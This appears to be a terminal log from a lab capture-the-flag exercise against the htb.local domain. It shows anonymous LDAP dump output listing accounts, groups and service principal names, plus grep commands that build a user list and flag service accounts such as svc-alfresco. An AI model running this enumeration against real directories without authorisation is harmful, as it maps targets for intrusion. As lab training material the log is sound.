dn: CN=6ff880d6-11e7-4ed1-a20f-aac45da48650,CN=Operations,CN=DomainUpdates,CN=
dn: CN=446f24ea-cfd5-4c52-8346-96e170bcb912,CN=Operations,CN=DomainUpdates,CN=
dn: CN=51cba88b-99cf-4e16-bef2-c427b38d0767,CN=Operations,CN=DomainUpdates,CN=
dn: CN=a3dac986-80e7-4e59-a059-54cb1ab43cb9,CN=Operations,CN=DomainUpdates,CN=
dn: CN=293f0798-ea5c-4455-9f5d-45f33a30703b,CN=Operations,CN=DomainUpdates,CN=
dn: CN=5c82b233-75fc-41b3-ac71-c69592e6bf15,CN=Operations,CN=DomainUpdates,CN=
dn: CN=7ffef925-405b-440a-8d58-35e8cd6e98c3,CN=Operations,CN=DomainUpdates,CN=
dn: CN=4dfbb973-8a62-4310-a90c-776e00f83222,CN=Operations,CN=DomainUpdates,CN=
dn: CN=8437C3D8-7689-4200-BF38-79E4AC33DFA0,CN=Operations,CN=DomainUpdates,CN=
dn: CN=7cfb016c-4f87-4406-8166-bd9df943947f,CN=Operations,CN=DomainUpdates,CN=
dn: CN=f7ed4553-d82b-49ef-a839-2f38a36bb069,CN=Operations,CN=DomainUpdates,CN=
dn: CN=8ca38317-13a4-4bd4-806f-ebed6acb5d0c,CN=Operations,CN=DomainUpdates,CN=
dn: CN=3c784009-1f57-4e2a-9b04-6915c9e71961,CN=Operations,CN=DomainUpdates,CN=
dn: CN=6bcd5678-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
dn: CN=6bcd5679-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
dn: CN=6bcd567a-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
dn: CN=6bcd567b-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
dn: CN=6bcd567c-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
dn: CN=6bcd567d-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
dn: CN=6bcd567e-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
dn: CN=6bcd567f-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
dn: CN=6bcd5680-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
dn: CN=6bcd5681-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
dn: CN=6bcd5682-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
dn: CN=6bcd5683-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
dn: CN=6bcd5684-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
dn: CN=6bcd5685-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
dn: CN=6bcd5686-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
dn: CN=6bcd5687-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
dn: CN=6bcd5688-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
dn: CN=6bcd5689-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
dn: CN=6bcd568a-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
dn: CN=6bcd568b-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
dn: CN=6bcd568c-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
dn: CN=6bcd568d-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
dn: CN=3051c66f-b332-4a73-9a20-2d6a7d6e6a1c,CN=Operations,CN=DomainUpdates,CN=
dn: CN=3e4f4182-ac5d-4378-b760-0eab2de593e2,CN=Operations,CN=DomainUpdates,CN=
dn: CN=c4f17608-e611-11d6-9793-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
dn: CN=13d15cf0-e6c8-11d6-9793-00c04f613221,CN=Operations,CN=DomainUpdates,CN=
dn: CN=8ddf6913-1c7b-4c59-a5af-b9ca3b3d2c4c,CN=Operations,CN=DomainUpdates,CN=
dn: CN=dda1d01d-4bd7-4c49-a184-46f9241b560e,CN=Operations,CN=DomainUpdates,CN=
dn: CN=a1789bfb-e0a2-4739-8cc0-e77d892d080a,CN=Operations,CN=DomainUpdates,CN=
dn: CN=61b34cb0-55ee-4be9-b595-97810b92b017,CN=Operations,CN=DomainUpdates,CN=
dn: CN=57428d75-bef7-43e1-938b-2e749f5a8d56,CN=Operations,CN=DomainUpdates,CN=
dn: CN=ebad865a-d649-416f-9922-456b53bbb5b8,CN=Operations,CN=DomainUpdates,CN=
dn: CN=0b7fb422-3609-4587-8c2e-94b10f67d1bf,CN=Operations,CN=DomainUpdates,CN=
dn: CN=2951353e-d102-4ea5-906c-54247eeec741,CN=Operations,CN=DomainUpdates,CN=
dn: CN=71482d49-8870-4cb3-a438-b6fc9ec35d70,CN=Operations,CN=DomainUpdates,CN=
dn: CN=aed72870-bf16-4788-8ac7-22299c8207f1,CN=Operations,CN=DomainUpdates,CN=
dn: CN=f58300d1-b71a-4DB6-88a1-a8b9538beaca,CN=Operations,CN=DomainUpdates,CN=
dn: CN=231fb90b-c92a-40c9-9379-bacfc313a3e3,CN=Operations,CN=DomainUpdates,CN=
dn: CN=4aaabc3a-c416-4b9c-a6bb-4b453ab1c1f0,CN=Operations,CN=DomainUpdates,CN=
dn: CN=9738c400-7795-4d6e-b19d-c16cd6486166,CN=Operations,CN=DomainUpdates,CN=
dn: CN=de10d491-909f-4fb0-9abb-4b7865c0fe80,CN=Operations,CN=DomainUpdates,CN=
dn: CN=b96ed344-545a-4172-aa0c-68118202f125,CN=Operations,CN=DomainUpdates,CN=
dn: CN=4c93ad42-178a-4275-8600-16811d28f3aa,CN=Operations,CN=DomainUpdates,CN=
dn: CN=c88227bc-fcca-4b58-8d8a-cd3d64528a02,CN=Operations,CN=DomainUpdates,CN=
dn: CN=5e1574f6-55df-493e-a671-aaeffca6a100,CN=Operations,CN=DomainUpdates,CN=
dn: CN=d262aae8-41f7-48ed-9f35-56bbb677573d,CN=Operations,CN=DomainUpdates,CN=
dn: CN=82112ba0-7e4c-4a44-89d9-d46c9612bf91,CN=Operations,CN=DomainUpdates,CN=
dn: CN=c3c927a6-cc1d-47c0-966b-be8f9b63d991,CN=Operations,CN=DomainUpdates,CN=
dn: CN=54afcfb9-637a-4251-9f47-4d50e7021211,CN=Operations,CN=DomainUpdates,CN=
dn: CN=f4728883-84dd-483c-9897-274f2ebcf11e,CN=Operations,CN=DomainUpdates,CN=
dn: CN=ff4f9d27-7157-4cb0-80a9-5d6f2b14c8ff,CN=Operations,CN=DomainUpdates,CN=
dn: CN=83C53DA7-427E-47A4-A07A-A324598B88F7,CN=Operations,CN=DomainUpdates,CN=
dn: CN=C81FC9CC-0130-4FD1-B272-634D74818133,CN=Operations,CN=DomainUpdates,CN=
dn: CN=E5F9E791-D96D-4FC9-93C9-D53E1DC439BA,CN=Operations,CN=DomainUpdates,CN=
dn: CN=e6d5fd00-385d-4e65-b02d-9da3493ed850,CN=Operations,CN=DomainUpdates,CN=
dn: CN=3a6b3fbf-3168-4312-a10d-dd5b3393952d,CN=Operations,CN=DomainUpdates,CN=
dn: CN=7F950403-0AB3-47F9-9730-5D7B0269F9BD,CN=Operations,CN=DomainUpdates,CN=
dn: CN=434bb40d-dbc9-4fe7-81d4-d57229f7b080,CN=Operations,CN=DomainUpdates,CN=
dn: CN=Windows2003Update,CN=DomainUpdates,CN=System,DC=htb,DC=local
dn: CN=ActiveDirectoryUpdate,CN=DomainUpdates,CN=System,DC=htb,DC=local
dn: CN=BCKUPKEY_bcb64993-1db6-45d5-9b0d-b8186e8ee6a4 Secret,CN=System,DC=htb,D
dn: CN=BCKUPKEY_P Secret,CN=System,DC=htb,DC=local
dn: CN=BCKUPKEY_b5b09264-b153-45ba-9501-e0f2b84c57a7 Secret,CN=System,DC=htb,D
dn: CN=BCKUPKEY_PREFERRED Secret,CN=System,DC=htb,DC=local
dn: CN=Password Settings Container,CN=System,DC=htb,DC=local
dn: CN=PSPs,CN=System,DC=htb,DC=local
dn: CN=Server,CN=System,DC=htb,DC=local
dn: CN=LostAndFound,DC=htb,DC=local
dn: CN=Infrastructure,DC=htb,DC=local
dn: CN=ForeignSecurityPrincipals,DC=htb,DC=local
dn: CN=S-1-5-9,CN=ForeignSecurityPrincipals,DC=htb,DC=local
memberOf: CN=Windows Authorization Access Group,CN=Builtin,DC=htb,DC=local
dn: CN=S-1-5-7,CN=ForeignSecurityPrincipals,DC=htb,DC=local
memberOf: CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=htb,DC=local
dn: CN=S-1-1-0,CN=ForeignSecurityPrincipals,DC=htb,DC=local
memberOf: CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=htb,DC=local
dn: CN=S-1-5-4,CN=ForeignSecurityPrincipals,DC=htb,DC=local
memberOf: CN=Users,CN=Builtin,DC=htb,DC=local
dn: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=htb,DC=local
memberOf: CN=Users,CN=Builtin,DC=htb,DC=local
dn: CN=S-1-5-17,CN=ForeignSecurityPrincipals,DC=htb,DC=local
memberOf: CN=IIS_IUSRS,CN=Builtin,DC=htb,DC=local
dn: CN=Microsoft Exchange System Objects,DC=htb,DC=local
dn: CN=Monitoring Mailboxes,CN=Microsoft Exchange System Objects,DC=htb,DC=loc
dn: CN=HealthMailboxc3d7722415ad41a5b19e3e00e165edbe,CN=Monitoring Mailboxes,C
userAccountControl: 66048
sAMAccountName: HealthMailboxc3d7722
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
userPrincipalName: HealthMailboxc3d7722415ad41a5b19e3e00e165edbe@htb.local
msExchUserAccountControl: 0
dn: CN=ExchangeActiveSyncDevices,CN=HealthMailboxc3d7722415ad41a5b19e3e00e165e
dn:: Q049RUFTUHJvYmVEZXZpY2VUeXBlwqdFQVNQcm9iZURldmljZUlkMTQxLENOPUV4Y2hhbmdlQ
dn: CN=HealthMailboxfc9daad117b84fe08b081886bd8a5a50,CN=Monitoring Mailboxes,C
userAccountControl: 66048
sAMAccountName: HealthMailboxfc9daad
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
userPrincipalName: HealthMailboxfc9daad117b84fe08b081886bd8a5a50@htb.local
msExchUserAccountControl: 0
dn: CN=ExchangeActiveSyncDevices,CN=HealthMailboxfc9daad117b84fe08b081886bd8a5
dn:: Q049RUFTUHJvYmVEZXZpY2VUeXBlwqdFQVNQcm9iZURldmljZUlkMTQxLENOPUV4Y2hhbmdlQ
dn: CN=HealthMailboxc0a90c97d4994429b15003d6a518f3f5,CN=Monitoring Mailboxes,C
userAccountControl: 66048
sAMAccountName: HealthMailboxc0a90c9
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
userPrincipalName: HealthMailboxc0a90c97d4994429b15003d6a518f3f5@htb.local
msExchUserAccountControl: 0
dn: CN=HealthMailbox670628ec4dd64321acfdf6e67db3a2d8,CN=Monitoring Mailboxes,C
userAccountControl: 66048
sAMAccountName: HealthMailbox670628e
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
userPrincipalName: HealthMailbox670628ec4dd64321acfdf6e67db3a2d8@htb.local
msExchUserAccountControl: 0
dn: CN=HealthMailbox968e74dd3edb414cb4018376e7dd95ba,CN=Monitoring Mailboxes,C
userAccountControl: 66048
sAMAccountName: HealthMailbox968e74d
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
userPrincipalName: HealthMailbox968e74dd3edb414cb4018376e7dd95ba@htb.local
msExchUserAccountControl: 0
dn: CN=HealthMailbox6ded67848a234577a1756e072081d01f,CN=Monitoring Mailboxes,C
userAccountControl: 66048
sAMAccountName: HealthMailbox6ded678
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
userPrincipalName: HealthMailbox6ded67848a234577a1756e072081d01f@htb.local
msExchUserAccountControl: 0
dn: CN=HealthMailbox83d6781be36b4bbf8893b03c2ee379ab,CN=Monitoring Mailboxes,C
userAccountControl: 66048
sAMAccountName: HealthMailbox83d6781
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
userPrincipalName: HealthMailbox83d6781be36b4bbf8893b03c2ee379ab@htb.local
msExchUserAccountControl: 0
dn: CN=HealthMailboxfd87238e536e49e08738480d300e3772,CN=Monitoring Mailboxes,C
userAccountControl: 66048
sAMAccountName: HealthMailboxfd87238
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
userPrincipalName: HealthMailboxfd87238e536e49e08738480d300e3772@htb.local
msExchUserAccountControl: 0
dn: CN=HealthMailboxb01ac647a64648d2a5fa21df27058a24,CN=Monitoring Mailboxes,C
userAccountControl: 66048
sAMAccountName: HealthMailboxb01ac64
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
userPrincipalName: HealthMailboxb01ac647a64648d2a5fa21df27058a24@htb.local
msExchUserAccountControl: 0
dn: CN=HealthMailbox7108a4e350f84b32a7a90d8e718f78cf,CN=Monitoring Mailboxes,C
userAccountControl: 66048
sAMAccountName: HealthMailbox7108a4e
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
userPrincipalName: HealthMailbox7108a4e350f84b32a7a90d8e718f78cf@htb.local
msExchUserAccountControl: 0
dn: CN=HealthMailbox0659cc188f4c4f9f978f6c2142c4181e,CN=Monitoring Mailboxes,C
userAccountControl: 66048
sAMAccountName: HealthMailbox0659cc1
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
userPrincipalName: HealthMailbox0659cc188f4c4f9f978f6c2142c4181e@htb.local
msExchUserAccountControl: 0
dn: CN=Exchange Install Domain Servers,CN=Microsoft Exchange System Objects,DC
memberOf: CN=Exchange Servers,OU=Microsoft Exchange Security Groups,DC=htb,DC=
sAMAccountName: $D31000-NSEL5BRJ63V7
msExchUserAccountControl: 0
dn: CN=SystemMailbox{ce2583c9-4e38-48ab-b23d-88d6e3aa059f},CN=Microsoft Exchan
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
msExchUserAccountControl: 0
dn: CN=Program Data,DC=htb,DC=local
dn: CN=Microsoft,CN=Program Data,DC=htb,DC=local
dn: CN=NTDS Quotas,DC=htb,DC=local
dn: CN=Managed Service Accounts,DC=htb,DC=local
dn: CN=Keys,DC=htb,DC=local
dn: OU=Service Accounts,DC=htb,DC=local
dn: CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local
dn: OU=Security Groups,DC=htb,DC=local
dn: CN=Service Accounts,OU=Security Groups,DC=htb,DC=local
dn: CN=Privileged IT Accounts,OU=Security Groups,DC=htb,DC=local
dn: CN=test,OU=Security Groups,DC=htb,DC=local
sAMAccountName: test
dn: OU=Employees,DC=htb,DC=local
dn: OU=Information Technology,OU=Employees,DC=htb,DC=local
dn: OU=Exchange Administrators,OU=Information Technology,OU=Employees,DC=htb,D
dn: CN=Sebastien Caron,OU=Exchange Administrators,OU=Information Technology,OU
userAccountControl: 66048
sAMAccountName: sebastien
userPrincipalName: sebastien@htb.local
dn: OU=Developers,OU=Information Technology,OU=Employees,DC=htb,DC=local
dn: CN=Santi Rodriguez,OU=Developers,OU=Information Technology,OU=Employees,DC
userAccountControl: 66048
sAMAccountName: santi
userPrincipalName: santi@htb.local
dn: OU=Application Support,OU=Information Technology,OU=Employees,DC=htb,DC=lo
dn: OU=IT Management,OU=Information Technology,OU=Employees,DC=htb,DC=local
dn: CN=Lucinda Berger,OU=IT Management,OU=Information Technology,OU=Employees,
userAccountControl: 66048
sAMAccountName: lucinda
userPrincipalName: lucinda@htb.local
dn: OU=Helpdesk,OU=Information Technology,OU=Employees,DC=htb,DC=local
dn: CN=Andy Hislip,OU=Helpdesk,OU=Information Technology,OU=Employees,DC=htb,D
userAccountControl: 66048
sAMAccountName: andy
userPrincipalName: andy@htb.local
dn: OU=Sysadmins,OU=Information Technology,OU=Employees,DC=htb,DC=local
dn: CN=Mark Brandt,OU=Sysadmins,OU=Information Technology,OU=Employees,DC=htb,
userAccountControl: 66048
sAMAccountName: mark
userPrincipalName: mark@htb.local
dn: OU=Sales,OU=Employees,DC=htb,DC=local
dn: OU=Marketing,OU=Employees,DC=htb,DC=local
dn: OU=Reception,OU=Employees,DC=htb,DC=local
dn: CN=TPM Devices,DC=htb,DC=local
dn: CN=Builtin,DC=htb,DC=local
dn: CN=Account Operators,CN=Builtin,DC=htb,DC=local
dn: CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=htb,DC=local
sAMAccountName: Pre-Windows 2000 Compatible Access
dn: CN=Incoming Forest Trust Builders,CN=Builtin,DC=htb,DC=local
sAMAccountName: Incoming Forest Trust Builders
dn: CN=Windows Authorization Access Group,CN=Builtin,DC=htb,DC=local
sAMAccountName: Windows Authorization Access Group
dn: CN=Terminal Server License Servers,CN=Builtin,DC=htb,DC=local
sAMAccountName: Terminal Server License Servers
dn: CN=Administrators,CN=Builtin,DC=htb,DC=local
dn: CN=Users,CN=Builtin,DC=htb,DC=local
sAMAccountName: Users
dn: CN=Guests,CN=Builtin,DC=htb,DC=local
sAMAccountName: Guests
dn: CN=Print Operators,CN=Builtin,DC=htb,DC=local
dn: CN=Backup Operators,CN=Builtin,DC=htb,DC=local
dn: CN=Replicator,CN=Builtin,DC=htb,DC=local
dn: CN=Remote Desktop Users,CN=Builtin,DC=htb,DC=local
sAMAccountName: Remote Desktop Users
dn: CN=Network Configuration Operators,CN=Builtin,DC=htb,DC=local
sAMAccountName: Network Configuration Operators
dn: CN=Performance Monitor Users,CN=Builtin,DC=htb,DC=local
sAMAccountName: Performance Monitor Users
dn: CN=Performance Log Users,CN=Builtin,DC=htb,DC=local
sAMAccountName: Performance Log Users
dn: CN=Distributed COM Users,CN=Builtin,DC=htb,DC=local
sAMAccountName: Distributed COM Users
dn: CN=IIS_IUSRS,CN=Builtin,DC=htb,DC=local
sAMAccountName: IIS_IUSRS
dn: CN=Cryptographic Operators,CN=Builtin,DC=htb,DC=local
sAMAccountName: Cryptographic Operators
dn: CN=Event Log Readers,CN=Builtin,DC=htb,DC=local
sAMAccountName: Event Log Readers
dn: CN=Certificate Service DCOM Access,CN=Builtin,DC=htb,DC=local
sAMAccountName: Certificate Service DCOM Access
dn: CN=RDS Remote Access Servers,CN=Builtin,DC=htb,DC=local
sAMAccountName: RDS Remote Access Servers
dn: CN=RDS Endpoint Servers,CN=Builtin,DC=htb,DC=local
sAMAccountName: RDS Endpoint Servers
dn: CN=RDS Management Servers,CN=Builtin,DC=htb,DC=local
sAMAccountName: RDS Management Servers
dn: CN=Hyper-V Administrators,CN=Builtin,DC=htb,DC=local
sAMAccountName: Hyper-V Administrators
dn: CN=Access Control Assistance Operators,CN=Builtin,DC=htb,DC=local
sAMAccountName: Access Control Assistance Operators
dn: CN=Remote Management Users,CN=Builtin,DC=htb,DC=local
sAMAccountName: Remote Management Users
dn: CN=System Managed Accounts Group,CN=Builtin,DC=htb,DC=local
sAMAccountName: System Managed Accounts Group
dn: CN=Storage Replica Administrators,CN=Builtin,DC=htb,DC=local
sAMAccountName: Storage Replica Administrators
dn: CN=Server Operators,CN=Builtin,DC=htb,DC=local
dn: OU=Microsoft Exchange Security Groups,DC=htb,DC=local
dn: CN=Organization Management,OU=Microsoft Exchange Security Groups,DC=htb,DC
sAMAccountName: Organization Management
msExchUserAccountControl: 0
dn: CN=Recipient Management,OU=Microsoft Exchange Security Groups,DC=htb,DC=lo
sAMAccountName: Recipient Management
msExchUserAccountControl: 0
dn: CN=View-Only Organization Management,OU=Microsoft Exchange Security Groups
sAMAccountName: View-Only Organization Management
msExchUserAccountControl: 0
dn: CN=Public Folder Management,OU=Microsoft Exchange Security Groups,DC=htb,D
sAMAccountName: Public Folder Management
msExchUserAccountControl: 0
dn: CN=UM Management,OU=Microsoft Exchange Security Groups,DC=htb,DC=local
sAMAccountName: UM Management
msExchUserAccountControl: 0
dn: CN=Help Desk,OU=Microsoft Exchange Security Groups,DC=htb,DC=local
sAMAccountName: Help Desk
msExchUserAccountControl: 0
dn: CN=Records Management,OU=Microsoft Exchange Security Groups,DC=htb,DC=loca
sAMAccountName: Records Management
msExchUserAccountControl: 0
dn: CN=Discovery Management,OU=Microsoft Exchange Security Groups,DC=htb,DC=lo
sAMAccountName: Discovery Management
msExchUserAccountControl: 0
dn: CN=Server Management,OU=Microsoft Exchange Security Groups,DC=htb,DC=local
sAMAccountName: Server Management
msExchUserAccountControl: 0
dn: CN=Delegated Setup,OU=Microsoft Exchange Security Groups,DC=htb,DC=local
sAMAccountName: Delegated Setup
msExchUserAccountControl: 0
dn: CN=Hygiene Management,OU=Microsoft Exchange Security Groups,DC=htb,DC=loca
sAMAccountName: Hygiene Management
msExchUserAccountControl: 0
dn: CN=Compliance Management,OU=Microsoft Exchange Security Groups,DC=htb,DC=l
sAMAccountName: Compliance Management
msExchUserAccountControl: 0
dn: CN=Security Reader,OU=Microsoft Exchange Security Groups,DC=htb,DC=local
sAMAccountName: Security Reader
msExchUserAccountControl: 0
dn: CN=Security Administrator,OU=Microsoft Exchange Security Groups,DC=htb,DC=
sAMAccountName: Security Administrator
msExchUserAccountControl: 0
dn: CN=Exchange Servers,OU=Microsoft Exchange Security Groups,DC=htb,DC=local
memberOf: CN=Managed Availability Servers,OU=Microsoft Exchange Security Group
memberOf: CN=Windows Authorization Access Group,CN=Builtin,DC=htb,DC=local
sAMAccountName: Exchange Servers
msExchUserAccountControl: 0
dn: CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,DC=htb
memberOf: CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Group
sAMAccountName: Exchange Trusted Subsystem
msExchUserAccountControl: 0
dn: CN=Managed Availability Servers,OU=Microsoft Exchange Security Groups,DC=h
sAMAccountName: Managed Availability Servers
msExchUserAccountControl: 0
dn: CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=h
sAMAccountName: Exchange Windows Permissions
msExchUserAccountControl: 0
dn: CN=ExchangeLegacyInterop,OU=Microsoft Exchange Security Groups,DC=htb,DC=l
sAMAccountName: ExchangeLegacyInterop
msExchUserAccountControl: 0
❯ grep -i 'sAMAccountName:' content/ldap/ldap_anonymous_full.ldif \
  | awk '{print $2}' \
  | sort -u \
  | tee content/users/domain_users_raw.txt
$331000-VK4ADACQNUCA
$D31000-NSEL5BRJ63V7
Access
Allowed
andy
Cert
Certificate
Cloneable
Compliance
Cryptographic
DefaultAccount
Delegated
Denied
Discovery
Distributed
DnsAdmins
DnsUpdateProxy
Domain
Enterprise
Event
EXCH01$
Exchange
ExchangeLegacyInterop
FOREST$
Group
Guest
Guests
HealthMailbox0659cc1
HealthMailbox670628e
HealthMailbox6ded678
HealthMailbox7108a4e
HealthMailbox83d6781
HealthMailbox968e74d
HealthMailboxb01ac64
HealthMailboxc0a90c9
HealthMailboxc3d7722
HealthMailboxfc9daad
HealthMailboxfd87238
Help
Hygiene
Hyper-V
IIS_IUSRS
Incoming
Key
lucinda
Managed
mark
Network
Organization
Performance
Pre-Windows
Protected
Public
RAS
RDS
Recipient
Records
Remote
santi
sebastien
Security
Server
SM_1b41c9286325456bb
SM_1ffab36a2f5f479cb
SM_2c8eef0a09b545acb
SM_681f53d4942840e18
SM_75a538d3025e4db9a
SM_7c96b981967141ebb
SM_9b69f1b9d2cc45549
SM_c75ee099d0a64c91b
SM_ca8c2ed5bdab4dc9b
Storage
System
Terminal
test
UM
Users
View-Only
Windows
❯ grep -Ei 'alfresco|svc|service|exchange|mailbox|systemmailbox' \
  content/ldap/ldap_interesting_fields.txt \
  | tee content/ad/service_account_hints.txt
dn: CN=Exchange Online-ApplicationAccount,CN=Users,DC=htb,DC=local
userPrincipalName: Exchange_Online-ApplicationAccount@htb.local
dn: CN=SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1},CN=Users,DC=htb,DC=
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
userPrincipalName: SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}@htb.loc
dn: CN=SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c},CN=Users,DC=htb,DC=
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
userPrincipalName: SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}@htb.loc
dn: CN=SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9},CN=Users,DC=htb,DC=
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
userPrincipalName: SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}@htb.loc
dn: CN=DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB852},CN=Users,
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
userPrincipalName: DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB85
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
dn: CN=SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201},CN=Users,DC=htb,DC=
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
userPrincipalName: SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}@htb.loc
dn: CN=SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA},CN=Users,DC=htb,DC=
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
userPrincipalName: SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}@htb.loc
dn: CN=SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9},CN=Users,DC=htb,DC=
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
userPrincipalName: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}@htb.loc
memberOf: CN=Exchange Install Domain Servers,CN=Microsoft Exchange System Obje
memberOf: CN=Managed Availability Servers,OU=Microsoft Exchange Security Group
memberOf: CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,
memberOf: CN=Exchange Servers,OU=Microsoft Exchange Security Groups,DC=htb,DC=
servicePrincipalName: IMAP/EXCH01
servicePrincipalName: IMAP/EXCH01.htb.local
servicePrincipalName: IMAP4/EXCH01
servicePrincipalName: IMAP4/EXCH01.htb.local
servicePrincipalName: POP/EXCH01
servicePrincipalName: POP/EXCH01.htb.local
servicePrincipalName: POP3/EXCH01
servicePrincipalName: POP3/EXCH01.htb.local
servicePrincipalName: exchangeRFR/EXCH01
servicePrincipalName: exchangeRFR/EXCH01.htb.local
servicePrincipalName: exchangeAB/EXCH01
servicePrincipalName: exchangeAB/EXCH01.htb.local
servicePrincipalName: exchangeMDB/EXCH01
servicePrincipalName: exchangeMDB/EXCH01.htb.local
servicePrincipalName: SMTP/EXCH01
servicePrincipalName: SMTP/EXCH01.htb.local
servicePrincipalName: SmtpSvc/EXCH01
servicePrincipalName: SmtpSvc/EXCH01.htb.local
servicePrincipalName: WSMAN/EXCH01
servicePrincipalName: WSMAN/EXCH01.htb.local
servicePrincipalName: RestrictedKrbHost/EXCH01
servicePrincipalName: HOST/EXCH01
servicePrincipalName: RestrictedKrbHost/EXCH01.htb.local
servicePrincipalName: HOST/EXCH01.htb.local
servicePrincipalName: TERMSRV/FOREST
servicePrincipalName: TERMSRV/FOREST.htb.local
servicePrincipalName: exchangeAB/FOREST
servicePrincipalName: exchangeAB/FOREST.htb.local
servicePrincipalName: Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/FOREST.htb.loc
servicePrincipalName: ldap/FOREST.htb.local/ForestDnsZones.htb.local
servicePrincipalName: ldap/FOREST.htb.local/DomainDnsZones.htb.local
servicePrincipalName: DNS/FOREST.htb.local
servicePrincipalName: GC/FOREST.htb.local/htb.local
servicePrincipalName: RestrictedKrbHost/FOREST.htb.local
servicePrincipalName: RestrictedKrbHost/FOREST
servicePrincipalName: RPC/236ba33a-7959-4a41-b959-5f82689a0871._msdcs.htb.loca
servicePrincipalName: HOST/FOREST/HTB
servicePrincipalName: HOST/FOREST.htb.local/HTB
servicePrincipalName: HOST/FOREST
servicePrincipalName: HOST/FOREST.htb.local
servicePrincipalName: HOST/FOREST.htb.local/htb.local
servicePrincipalName: E3514235-4B06-11D1-AB04-00C04FC2DCD2/236ba33a-7959-4a41-
servicePrincipalName: ldap/FOREST/HTB
servicePrincipalName: ldap/236ba33a-7959-4a41-b959-5f82689a0871._msdcs.htb.loc
servicePrincipalName: ldap/FOREST.htb.local/HTB
servicePrincipalName: ldap/FOREST
servicePrincipalName: ldap/FOREST.htb.local
servicePrincipalName: ldap/FOREST.htb.local/htb.local
dn: CN=WinsockServices,CN=System,DC=htb,DC=local
dn: CN=RpcServices,CN=System,DC=htb,DC=local
dn: CN=File Replication Service,CN=System,DC=htb,DC=local
dn: CN=Microsoft Exchange System Objects,DC=htb,DC=local
dn: CN=Monitoring Mailboxes,CN=Microsoft Exchange System Objects,DC=htb,DC=loc
dn: CN=HealthMailboxc3d7722415ad41a5b19e3e00e165edbe,CN=Monitoring Mailboxes,C
sAMAccountName: HealthMailboxc3d7722
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
userPrincipalName: HealthMailboxc3d7722415ad41a5b19e3e00e165edbe@htb.local
